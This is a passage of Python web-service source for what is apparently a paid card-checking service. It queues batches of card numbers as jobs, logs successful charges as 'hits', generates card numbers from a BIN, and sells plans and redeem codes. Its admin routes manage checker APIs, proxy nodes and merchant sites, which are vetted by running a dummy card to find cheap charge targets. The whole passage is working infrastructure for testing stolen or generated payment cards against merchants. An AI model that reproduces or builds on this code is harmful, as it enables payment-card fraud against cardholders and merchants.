            raise HTTPException(400,f"batch limit {mass_limit} for {user['plan']}")
        today = datetime.now(timezone.utc).date().isoformat()
        if user["last_check_date"] != today:
            ex("UPDATE users SET daily_checks=0, last_check_date=? WHERE id=?", (today, user["id"]))
        daily_limits = {"free":1000,"pro":5000,"premium":10000,"max":30000,"unlimited":999999}
        daily = daily_limits.get(user["plan"],1000)
        used = q1("SELECT daily_checks FROM users WHERE id=?", (user["id"],))["daily_checks"]
        remaining = daily - used
        if remaining <= 0: raise HTTPException(400,"daily limit reached")
        cards = cards[:min(len(cards), remaining)]
        ex("UPDATE users SET daily_checks=daily_checks+?, total_checks=total_checks+? WHERE id=?",
           (len(cards), len(cards), user["id"]))
    job_id = uuid.uuid4().hex[:12]
    ex("INSERT INTO jobs(id,user_id,name,status,phase,total,created_at) VALUES (?,?,?,?,?,?,?)",
       (job_id, user["id"], body.name or f"Job {job_id[:6]}", "queued", "checking", len(cards), _now()))
    for cc in cards:
        ex("INSERT INTO cards(job_id,user_id,cc) VALUES (?,?,?)", (job_id, user["id"], cc))
    return {"job_id": job_id, "total": len(cards)}

@app.get("/api/jobs")
async def list_jobs(user=Depends(_user_from)):
    rows = q("SELECT * FROM jobs WHERE user_id=? ORDER BY created_at DESC LIMIT 50", (user["id"],))
    return [dict(r) for r in rows]

@app.get("/api/jobs/{job_id}")
async def get_job(job_id: str, user=Depends(_user_from)):
    j = q1("SELECT * FROM jobs WHERE id=? AND user_id=?", (job_id, user["id"]))
    if not j: raise HTTPException(404,"not found")
    cards = q("SELECT * FROM cards WHERE job_id=? ORDER BY id", (job_id,))
    return {"job": dict(j), "cards": [dict(c) for c in cards]}

@app.delete("/api/jobs/{job_id}")
async def del_job(job_id: str, user=Depends(_user_from)):
    ex("DELETE FROM cards WHERE job_id=? AND user_id=?", (job_id, user["id"]))
    ex("DELETE FROM jobs WHERE id=? AND user_id=?", (job_id, user["id"]))
    return {"ok": True}

@app.get("/api/hits")
async def my_hits(user=Depends(_user_from)):
    rows = q("SELECT * FROM charged WHERE user_id=? ORDER BY id DESC", (user["id"],))
    return [dict(r) for r in rows]

@app.delete("/api/hits/{hid}")
async def del_hit(hid: int, user=Depends(_user_from)):
    ex("DELETE FROM charged WHERE id=? AND user_id=?", (hid, user["id"])); return {"ok": True}

@app.delete("/api/hits")
async def clear_hits(user=Depends(_user_from)):
    ex("DELETE FROM charged WHERE user_id=?", (user["id"],)); return {"ok": True}

@app.post("/api/cc/gen")
async def cc_gen(body: GenIn, user=Depends(_user_from)):
    return {"cards": generate_cc(body.bin, body.month, body.year, body.cvv, min(500, max(1, body.count)))}

@app.get("/api/bin/{bin}")
async def bin_endpoint(bin: str, user=Depends(_user_from)):
    bin6 = re.sub(r"\D","",bin)[:8]
    if len(bin6) < 6: raise HTTPException(400,"need at least 6 digits")
    return await bin_lookup(bin6[:6])

@app.post("/api/redeem")
async def redeem(body: RedeemIn, user=Depends(_user_from)):
    code = body.code.strip().upper()
    row = q1("SELECT * FROM redeem_codes WHERE code=?", (code,))
    if not row: raise HTTPException(400,"invalid code")
    if row["used"] >= row["max_uses"]: raise HTTPException(400,"exhausted")
    days = row["days"]
    exp = (datetime.now(timezone.utc) + timedelta(days=days)).isoformat()
    ex("UPDATE users SET plan=?, plan_expires=? WHERE id=?", (row["plan"], exp, user["id"]))
    ex("UPDATE redeem_codes SET used=used+1 WHERE code=?", (code,))
    return {"ok": True, "plan": row["plan"], "days": days}

@app.get("/api/notifications")
async def get_notifs(user=Depends(_user_from)):
    return [dict(r) for r in q("SELECT * FROM notifications WHERE user_id IN (0,?) ORDER BY id DESC LIMIT 30", (user["id"],))]

@app.post("/api/notifications/read")
async def read_notifs(user=Depends(_user_from)):
    ex("UPDATE notifications SET read=1 WHERE user_id IN (0,?)", (user["id"],)); return {"ok": True}

# ── Admin ───────────────────────────────────────────────────────────────────
@app.get("/api/admin/users")
async def admin_users(user=Depends(_admin)):
    return [_pub_user(r) for r in q("SELECT * FROM users ORDER BY id DESC")]

@app.post("/api/admin/users")
async def admin_create_user(body: UserCreateIn, user=Depends(_admin)):
    email = body.email.strip().lower()
    if q1("SELECT id FROM users WHERE email=?", (email,)): raise HTTPException(400,"email exists")
    uid = ex("INSERT INTO users(email,password,name,plan,credits,created_at) VALUES (?,?,?,?,?,?)",
             (email, _hash(body.password), body.name, body.plan, body.credits, _now()))
    return {"id": uid}

@app.put("/api/admin/users/{uid}")
async def admin_update_user(uid: int, body: UserUpdateIn, user=Depends(_admin)):
    sets, params = [], []
    if body.plan is not None: sets.append("plan=?"); params.append(body.plan)
    if body.credits is not None: sets.append("credits=?"); params.append(body.credits)
    if body.banned is not None: sets.append("banned=?"); params.append(body.banned)
    if body.password is not None: sets.append("password=?"); params.append(_hash(body.password))
    if sets: params.append(uid); ex(f"UPDATE users SET {','.join(sets)} WHERE id=?", tuple(params))
    return {"ok": True}

@app.delete("/api/admin/users/{uid}")
async def admin_del_user(uid: int, user=Depends(_admin)):
    ex("DELETE FROM users WHERE id=? AND is_admin=0", (uid,)); return {"ok": True}

@app.get("/api/admin/apis")
async def admin_apis(user=Depends(_admin)):
    return [dict(r) for r in q("SELECT * FROM apis ORDER BY id")]

@app.post("/api/admin/apis")
async def admin_add_api(body: ApiIn, user=Depends(_admin)):
    aid = ex("INSERT INTO apis(name,url,style,site_required,cap,enabled,api_key,created_at) VALUES (?,?,?,?,?,?,?,?)",
             (body.name, body.url, body.style, body.site_required, body.cap, body.enabled, body.api_key, _now()))
    return {"id": aid}

@app.put("/api/admin/apis/{aid}")
async def admin_upd_api(aid: int, body: ApiIn, user=Depends(_admin)):
    ex("UPDATE apis SET name=?,url=?,style=?,site_required=?,cap=?,enabled=?,api_key=? WHERE id=?",
       (body.name, body.url, body.style, body.site_required, body.cap, body.enabled, body.api_key, aid))
    return {"ok": True}

@app.delete("/api/admin/apis/{aid}")
async def admin_del_api(aid: int, user=Depends(_admin)):
    ex("DELETE FROM apis WHERE id=?", (aid,)); return {"ok": True}

# nodes
@app.get("/api/admin/nodes")
async def admin_nodes(user=Depends(_admin)):
    return [dict(r) for r in q("SELECT * FROM nodes ORDER BY pool, id")]

@app.post("/api/admin/nodes")
async def admin_add_node(body: NodeIn, user=Depends(_admin)):
    nid = ex("INSERT INTO nodes(name,url,pool,enabled,status,created_at) VALUES (?,?,?,?,?,?)",
             (body.name, body.url.rstrip("/"), body.pool, body.enabled, "unknown", _now()))
    return {"id": nid}

@app.put("/api/admin/nodes/{nid}")
async def admin_upd_node(nid: int, body: NodeIn, user=Depends(_admin)):
    ex("UPDATE nodes SET name=?,url=?,pool=?,enabled=? WHERE id=?",
       (body.name, body.url.rstrip("/"), body.pool, body.enabled, nid))
    return {"ok": True}

@app.delete("/api/admin/nodes/{nid}")
async def admin_del_node(nid: int, user=Depends(_admin)):
    ex("DELETE FROM nodes WHERE id=?", (nid,)); return {"ok": True}

@app.post("/api/admin/nodes/probe")
async def admin_probe_nodes(user=Depends(_admin)):
    await probe_nodes(); return {"ok": True}

# sites
@app.get("/api/admin/sites")
async def admin_sites(user=Depends(_admin)):
    return [dict(r) for r in q("SELECT * FROM sites ORDER BY id")]

@app.post("/api/admin/sites")
async def admin_add_site(body: SiteIn, user=Depends(_admin)):
    url = body.url.strip().lower()
    url = url.split("://",1)[-1].split("/")[0]
    if not url: raise HTTPException(400,"empty")
    if q1("SELECT id FROM sites WHERE url=?", (url,)): raise HTTPException(400,"already exists")
    # validate with first available site-required api/node
    dummy = DUMMY_CC
    apis = q("SELECT * FROM apis WHERE enabled=1 AND site_required=1")
    node = _pick_node()
    price = 0.0
    health = "unknown"
    if apis or node:
        ep = dict(apis[0]) if apis else None
        res = await check_one(dummy, None, node, ep, url)
        price = res.get("amount",0.0)
        health = "ok" if res["cls"] != "error" else "down"
        if res["cls"] == "error" and price == 0:
            # still save but mark down — admin can retry
            pass
        max_price = float(_get_setting("site_max_price","3.0") or 3.0)
        if price > max_price:
            raise HTTPException(400, f"price ${price:.2f} exceeds max ${max_price:.2f}")
    sid = ex("INSERT INTO sites(url,price,health,last_check,created_at) VALUES (?,?,?,?,?)",
             (url, price, health, time.time(), _now()))
    return {"id": sid, "url": url, "price": price, "health": health}

@app.post("/api/admin/sites/bulk")
async def admin_add_sites_bulk(body: dict, user=Depends(_admin)):
    urls = [u.strip().lower() for u in (body.get("urls") or []) if u.strip()]
    added, rejected = [], []
    max_price = float(_get_setting("site_max_price","3.0") or 3.0)
    apis = q("SELECT * FROM apis WHERE enabled=1 AND site_required=1")
    node = _pick_node()
    for u in urls:
        u2 = u.split("://",1)[-1].split("/")[0]
        if not u2 or q1("SELECT id FROM sites WHERE url=?", (u2,)):
            rejected.append({"url": u2, "reason": "exists/empty"}); continue
        price = 0.0
        health = "unknown"
        if apis or node:
            ep = dict(apis[0]) if apis else None
            res = await check_one(DUMMY_CC, None, node, ep, u2)
            price = res.get("amount",0.0)
            health = "ok" if res["cls"] != "error" else "down"
        if price > max_price:
            rejected.append({"url": u2, "reason": f"price ${price:.2f} > ${max_price:.2f}"}); continue
        ex("INSERT OR IGNORE INTO sites(url,price,health,last_check,created_at) VALUES (?,?,?,?,?)",
           (u2, price, health, time.time(), _now()))
        added.append(u2)
    return {"added": added, "rejected": rejected}

@app.put("/api/admin/sites/{sid}")
async def admin_upd_site(sid: int, body: dict, user=Depends(_admin)):
    sets, params = [], []
    for k in ("url","health"):
        if k in body: sets.append(f"{k}=?"); params.append(body[k])
    if "price" in body: sets.append("price=?"); params.append(float(body["price"]))
    if sets: params.append(sid); ex(f"UPDATE sites SET {','.join(sets)} WHERE id=?", tuple(params))
    return {"ok": True}

@app.delete("/api/admin/sites/{sid}")
async def admin_del_site(sid: int, user=Depends(_admin)):
    ex("DELETE FROM sites WHERE id=?", (sid,)); return {"ok": True}

@app.post("/api/admin/sites/probe")
async def admin_probe_sites(user=Depends(_admin)):
    sites = q("SELECT * FROM sites")
    apis = q("SELECT * FROM apis WHERE enabled=1 AND site_required=1")
    node = _pick_node()
    for s in sites:
        if apis or node:
            ep = dict(apis[0]) if apis else None
            res = await check_one(DUMMY_CC, None, node, ep, s["url"])
            health = "ok" if res["cls"] != "error" else "down"
            price = res.get("amount",0.0) or s["price"]
            ex("UPDATE sites SET health=?, price=?, last_check=? WHERE id=?", (health, price, time.time(), s["id"]))
    return {"ok": True}

# charged / jobs admin
@app.get("/api/admin/charged")
async def admin_charged(user=Depends(_admin)):
    rows = q("SELECT c.*, u.email as user_email FROM charged c LEFT JOIN users u ON u.id=c.user_id ORDER BY c.id DESC LIMIT 500")
    return [dict(r) for r in rows]

@app.delete("/api/admin/charged")
async def admin_clear_charged(user=Depends(_admin)):
    ex("DELETE FROM charged"); return {"ok": True}

@app.get("/api/admin/jobs")
async def admin_jobs(user=Depends(_admin)):
    rows = q("SELECT j.*, u.email as user_email FROM jobs j LEFT JOIN users u ON u.id=j.user_id ORDER BY j.created_at DESC LIMIT 100")
    return [dict(r) for r in rows]

@app.get("/api/admin/codes")
async def admin_codes(user=Depends(_admin)):
    return [dict(r) for r in q("SELECT * FROM redeem_codes ORDER BY code DESC")]

@app.post("/api/admin/codes")
async def admin_create_code(body: CodeIn, user=Depends(_admin)):
    code = "ERR0R-" + "".join(random.choices(string.ascii_uppercase+string.digits, k=6))
    ex("INSERT INTO redeem_codes(code,plan,max_uses,days) VALUES (?,?,?,?)",
       (code, body.plan, body.uses, body.days))
    return {"code": code}

@app.delete("/api/admin/codes/{code}")
async def admin_del_code(code: str, user=Depends(_admin)):
    ex("DELETE FROM redeem_codes WHERE code=?", (code,)); return {"ok": True}

@app.get("/api/admin/settings")
async def admin_settings(user=Depends(_admin)):
    return {r["key"]: r["value"] for r in q("SELECT * FROM settings")}

@app.post("/api/admin/settings")
async def admin_set_setting(body: SettingIn, user=Depends(_admin)):
    _set_setting(body.key, body.value); return {"ok": True}

@app.post("/api/admin/bot/test")
async def admin_bot_test(user=Depends(_admin)):
    await tg_send("<b>✅ err0r-z web</b>\nTest ping from admin panel.")
    return {"ok": True}

@app.post("/api/admin/notify")
async def admin_notify(body: NotifyIn, user=Depends(_admin)):
    ex("INSERT INTO notifications(user_id,text,ts) VALUES (?,?,?)", (body.user_id, body.text, _now()))
    return {"ok": True}

@app.get("/api/admin/stats")
async def admin_stats(user=Depends(_admin)):
    return {
        "users": q1("SELECT COUNT(*) as n FROM users")["n"],
        "jobs": q1("SELECT COUNT(*) as n FROM jobs")["n"],
        "hits": q1("SELECT COUNT(*) as n FROM charged")["n"],
        "apis": q1("SELECT COUNT(*) as n FROM apis")["n"],
        "nodes": q1("SELECT COUNT(*) as n FROM nodes")["n"],
        "sites": q1("SELECT COUNT(*) as n FROM sites")["n"],
        "checked": q1("SELECT COALESCE(SUM(total),0) as n FROM jobs")["n"],
    }